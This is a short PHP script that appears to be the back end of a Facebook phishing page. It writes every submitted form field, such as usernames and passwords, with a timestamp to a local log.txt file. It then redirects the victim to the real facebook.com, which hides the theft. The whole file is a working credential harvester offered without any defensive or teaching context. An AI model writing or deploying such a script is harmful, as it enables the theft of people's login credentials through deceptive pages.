<?php
header ('Location: https://www.facebook.com/');
$handle = fopen("log.txt", "a");
$date = date("d-m-y h:i:s");
fwrite($handle, $date);
fwrite($handle, "\n");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n\n\n\n");
fclose($handle);
exit;
?>